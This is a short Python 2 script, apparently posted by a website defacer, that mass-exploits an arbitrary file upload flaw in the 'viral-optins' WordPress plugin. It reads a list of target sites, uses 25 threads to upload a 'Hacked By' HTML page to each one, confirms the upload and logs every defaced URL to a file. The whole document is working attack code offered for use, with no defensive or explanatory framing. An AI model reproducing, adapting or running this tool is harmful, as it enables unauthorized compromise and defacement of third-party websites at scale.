import re, sys

try :
	import requests
except ImportError :
	print 'Install Request'
	exit (-1)

from random import sample as rand
from urlnorm import norm as urlnorm
from threading import Thread
from Queue import Queue
requests.packages.urllib3.disable_warnings ()
banner = '''
===============================================================================
|!| WordPrss Exploiter --->   Hard Work, and Late nights pays off           |!|
===============================================================================
|!| Coded By: S0u1izG0d > Thanks To : Mr.r00t - n00bz - Smi1ey - Os1r1s     |!|
===============================================================================
|!| Twitter: S0u1_HLoTW  Bros: Ch402 - Lulz Zombie - Vince "Calls me bunny" |!|
===============================================================================
'''
print banner
def exploit (url, fileupload = None) :

	if fileupload == None :
		fileupload = "<title> Hacked </title> <center> Hacked By S0u1 - Testing 0day mass deface exploiter - "
	filename = '13337.html'
	files = {
		'Filedata' : (filename, fileupload, 'text/html')
	}
	requests.post (url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', verify = False, files = files)
	uploader = url + 'wp-content/uploads/2017/12/' + filename
	res      = requests.get (uploader, verify = False)
	if '13337' in res.content :
		open ('Done.txt', 'a').write (uploader + '\n')
		return True

	return False

def start_worker () :
	while True :
		try :
			url = urlnorm (q.get ())

			if exploit (url) :
				sys.stdout.write (url + ' ===> Uploaded \n')
			else :
				sys.stdout.write (url + '\n')
		except :
			pass

		q.task_done ()

NUMBER_OF_THREADS = 25
q = Queue ()

for i in range (NUMBER_OF_THREADS) :
	t = Thread (target = start_worker)
	t.daemon = True
	t.start ()

if len (sys.argv) > 1 :
	try :
		file = open (sys.argv[1])
	except IOError :
		print 'File Not Found'
		exit (-1)

	for url in file :
		q.put (url.strip ())

	q.join () # block until all threads are done
else :
	print '\n\tUsage: python ' + sys.argv[0] + ' list.txt'